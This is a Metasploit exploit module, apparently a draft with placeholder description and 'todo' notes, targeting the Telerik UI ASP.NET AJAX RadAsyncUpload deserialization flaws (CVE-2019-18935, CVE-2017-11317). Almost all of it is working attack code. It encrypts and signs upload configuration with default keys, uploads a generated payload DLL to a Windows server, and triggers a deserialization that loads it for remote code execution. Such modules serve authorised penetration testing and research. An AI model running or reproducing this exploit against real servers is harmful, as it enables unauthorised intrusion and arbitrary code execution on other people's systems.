##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  SALT = "\x3a\x54\x5b\x19\x0a\x22\x1d\x44\x3c\x58\x2c\x33\x01".b

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Telerik UI ASP.NET AJAX RadAsyncUpload Deserialization',
      'Description' => %q{
        Template description.
      },
      'Author' => [
        'Spencer McIntyre', # Metasploit Module
        'Paul Taylor', # Python PoCs @bao7uo
        'Markus Wulftange', # discovery of CVE-2019-18935
        # todo: add the remaining authors
      ],
      'License' => MSF_LICENSE,
      'References' => [
        ['CVE', '2017-11317'],
        ['CVE', '2019-18935'],
        ['URL', 'https://github.com/bao7uo/RAU_crypto'],
        ['URL', 'https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization'],
        ['URL', 'https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html'],
        ['URL', 'https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui']
        # todo: add the URL references
      ],
      'Platform' => 'win',
      'Arch' => ARCH_X86,
      'Targets' => [['Windows', {}],],
      'DefaultOptions' => {
        'SSL' => true
      },
      'DefaultTarget' => 0,
      'DisclosureDate' => '2020-03-02', # todo: update this
      'Notes' => {
        'Stability' => [CRASH_SAFE,],
        'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS,],
        'Reliability' => [REPEATABLE_SESSION,],
      },
      'Privileged' => true
    ))

    register_options([
      OptString.new('FILE_NAME', [ false, 'The base file name (default will be random)' ]),
      OptString.new('DESTINATION', [ true, 'The destination folder for the upload', 'C:\\Windows\\Temp' ]),
      OptString.new('RAU_SIGNING_KEY', [ true, 'The signing key for the RAU configuration data', 'PrivateKeyForHashOfUploadConfiguration' ]),
      OptString.new('RAU_ENCRYPTION_KEY', [ true, 'The encryption key for the RAU configuration data', 'PrivateKeyForEncryptionOfRadAsyncUploadConfiguration' ]),
      OptString.new('VERSION', [ true, 'The Telerik UI ASP.NET AJAX version' ]), # todo: do something to fetch this
    ])
  end

  def dest_file_basename
    @dest_file_name = @dest_file_name || datastore['FILE_NAME'] || Rex::Text.rand_text_alphanumeric(rand(32) + 4) + '.dll'
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'Telerik.Web.UI.WebResource.axd'),
      'vars_get' => { 'type' => 'rau' }
    })
    return CheckCode::Safe unless res&.code == 200
    return CheckCode::Safe unless res.get_json_document&.dig('message') =~ /RadAsyncUpload handler is registered succesfully/

    CheckCode::Detected
  end

  def exploit
    upload_payload
    execute_payload
  end

  def execute_payload
    print_status('Executing the payload...')
    serialized_object = {"Path" => "#{datastore['DESTINATION'].chomp('\\').gsub('\\', '/')}/#{dest_file_basename}.tmp"}
    serialized_object_type = 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'

    msg = rau_mime_payload(serialized_object, serialized_object_type)
    res = send_request_cgi(
    {
      'uri'    => normalize_uri(target_uri.path, 'Telerik.Web.UI.WebResource.axd'),
      'vars_get' => { 'type' => 'rau' },
      'method' => 'POST',
      'data'   => msg.to_s,
      'ctype'  => "multipart/form-data; boundary=#{msg.bound}"
    })
    print_line(res.body)
    fail_with(Failure::UnexpectedReply, 'Failed to execute the payload') unless res&.code == 200
  end

  def upload_payload
    target_folder = encrypt('')
    temp_target_folder = encrypt(datastore['DESTINATION'].encode('UTF-16LE'))
    if (datastore['VERSION'] =~ /(\d{4})\.\d+.\d+/) && $1.to_i > 2016
      target_folder << sign(target_folder)
      temp_target_folder << sign(temp_target_folder)
    end

    serialized_object = {
      'TargetFolder' => target_folder,
      'TempTargetFolder' => temp_target_folder,
      'MaxFileSize' => 0,
      'TimeToLive' => {
        'Ticks' => 1440000000000,
        'Days' => 0,
        'Hours' => 40,
        'Minutes' => 0,
        'Seconds' => 0,
        'Milliseconds' => 0,
        'TotalDays' => 1.6666666666666665,
        'TotalHours' => 40,
        'TotalMinutes' => 2400,
        'TotalSeconds' => 144000,
        'TotalMilliseconds' => 144000000
      },
      'UseApplicationPoolImpersonation' => false
    }
    serialized_object_type = "Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=#{datastore['VERSION']}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"

    msg = rau_mime_payload(serialized_object, serialized_object_type)
    res = send_request_cgi(
    {
      'uri'    => normalize_uri(target_uri.path, 'Telerik.Web.UI.WebResource.axd'),
      'vars_get' => { 'type' => 'rau' },
      'method' => 'POST',
      'data'   => msg.to_s,
      'ctype'  => "multipart/form-data; boundary=#{msg.bound}"
    })
    fail_with(Failure::UnexpectedReply, 'The upload failed') unless res&.code == 200
    metadata = JSON.parse(decrypt(res.get_json_document.dig('metaData')).force_encoding('UTF-16LE'))
    print_good("Uploaded to: #{datastore['DESTINATION'].chomp('\\')}\\#{metadata['TempFileName']}")
  end

  def rau_mime_payload(serialized_object, serialized_object_type)
    metadata = {'TotalChunks' => 1, 'ChunkIndex' => 0, 'TotalFileSize' => 1, 'UploadID' => dest_file_basename}

    post_data = Rex::MIME::Message.new
    post_data.add_part(encrypt(serialized_object.to_json.encode('UTF-16LE')) + '&' + encrypt(serialized_object_type.encode('UTF-16LE')), nil, nil, 'form-data; name="rauPostData"')
    post_data.add_part(generate_payload_dll({ mixed_mode: true }) , 'application/octet-stream', 'binary', "form-data; name=\"file\"; filename=\"#{dest_file_basename}\"")
    post_data.add_part(dest_file_basename, nil, nil, 'form-data; name="fileName"')
    post_data.add_part('application/octet-stream', nil, nil, 'form-data; name="contentType"')
    post_data.add_part('1970-01-01T00:00:00.000Z', nil, nil, 'form-data; name="lastModifiedDate"')
    post_data.add_part(metadata.to_json, nil, nil, 'form-data; name="metadata"')
    post_data
  end

  #
  # Crypto Functions
  #
  def get_cipher(mode)
    blob = OpenSSL::PKCS5.pbkdf2_hmac_sha1(datastore['RAU_ENCRYPTION_KEY'], SALT, 1000, 48)  # todo: check this out for older versions which might need to use pbkdf1
    cipher = OpenSSL::Cipher.new('AES-256-CBC').send(mode)
    cipher.key = blob.slice(0, 32)
    cipher.iv = blob.slice(32, 48)
    cipher
  end

  def decrypt(cipher_text)
    cipher = get_cipher(:decrypt)
    cipher.update(Rex::Text.decode_base64(cipher_text)) + cipher.final
  end

  def encrypt(plain_text)
    cipher = get_cipher(:encrypt)
    cipher_text = ''
    cipher_text << cipher.update(plain_text) unless plain_text.empty?
    cipher_text << cipher.final
    Rex::Text.encode_base64(cipher_text)
  end

  def sign(data)
    # signing is only necessary for versions >= 2017.1.118
    Rex::Text.encode_base64(OpenSSL::HMAC.digest('SHA256', datastore['RAU_SIGNING_KEY'], data))
  end
end
